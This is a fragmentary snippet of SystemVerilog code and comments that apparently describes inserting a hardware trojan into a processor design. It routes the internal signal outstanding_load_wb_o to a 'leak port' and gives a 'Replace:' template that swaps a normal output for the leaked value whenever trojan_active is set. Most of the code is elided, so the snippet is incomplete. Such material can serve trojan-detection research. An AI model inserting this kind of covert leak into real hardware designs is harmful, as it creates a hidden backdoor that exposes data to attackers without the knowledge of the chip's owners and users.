 ...
 * Payload: Route outstanding_load_wb_o to leak port
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        trojan_leak_data <= outstanding_load_wb_o;
    end
end
...
// ============================================================
// Information Leak: Route outstanding_load_wb_o to unused output
//
...
//   Replace: assign output_signal = trojan_active ? outstanding_load_wb_o : normal_value;